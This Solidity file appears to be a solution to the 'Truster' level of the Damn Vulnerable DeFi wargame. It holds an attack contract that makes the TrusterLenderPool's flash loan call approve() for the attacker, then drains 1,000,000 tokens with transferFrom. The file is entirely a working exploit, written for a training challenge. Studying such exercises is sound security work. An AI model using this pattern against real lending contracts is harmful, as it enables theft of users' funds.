pragma solidity ^0.8.0;
import {TrusterLenderPool , DamnValuableToken} from "../truster/TrusterLenderPool.sol";
contract Target {
    TrusterLenderPool flashLoan;
    DamnValuableToken public immutable token;

    constructor(address _flashLoan, address _token)  {
        flashLoan = TrusterLenderPool(_flashLoan);
        token = DamnValuableToken(_token);
    }

    function attack(  address borrower   ) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000 ether);
        flashLoan.flashLoan(0, borrower, address(token), data);
        token.transferFrom(address(flashLoan), borrower, 1000000 ether);
    }

    
}
